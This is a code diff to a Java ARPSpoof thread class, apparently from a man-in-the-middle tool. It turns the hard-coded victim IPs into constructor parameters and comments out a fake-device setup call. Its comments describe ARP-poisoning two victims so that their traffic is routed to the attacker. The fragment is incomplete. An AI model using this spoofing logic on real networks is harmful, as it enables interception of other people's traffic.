@@ -19,12 +19,12 @@ public class ARPSpoof extends Thread {
 	private boolean isARPspoof;
 	private Sender middle_sender;
 
-	public ARPSpoof(NetworkInterface mydevice) {
+	public ARPSpoof(NetworkInterface mydevice, ArrayList<String> in) {
 		device = mydevice;
 		isARPspoof = false;
 		
-		victimAip = "192.168.111.11";
-		victimBip = "192.168.111.1";
+		victimAip = in.get(0);
+		victimBip = in.get(1);
 	}
 
 	public void setMacList(HashMap<String, String> in) {
@@ -34,11 +34,7 @@ public class ARPSpoof extends Thread {
 	public void setSender(Sender sd) {
 		this.middle_sender = sd;
 	}
-
-	public void setIPList(ArrayList<String> in) {
-		this.ips_to_explore = in;
-	}
-
+	
 	public void setARPspoof(boolean value) {
 		this.isARPspoof = value;
 	}
@@ -52,8 +48,8 @@ public class ARPSpoof extends Thread {
 		ARPPkt fakeme = new ARPPkt(null);
 
 		try {
-			fakeme.buildDevice("fakyo", "ihniwidyo", "fakyo", "fakeyo", Utils.calculate_mac(ip_mac_list.get(victimBip)),
-					localIp, Utils.__get_inet4(device).subnet.toString().split("/")[1]);
+			/*fakeme.buildDevice("fakyo", "ihniwidyo", "fakyo", "fakeyo", Utils.calculate_mac(ip_mac_list.get(victimBip)),
+					localIp, Utils.__get_inet4(device).subnet.toString().split("/")[1]);*/
 			/*
 			 * now we will create two fake devices to arp poison the to victims
 			 * giving them my mac address so their traffic will come to me
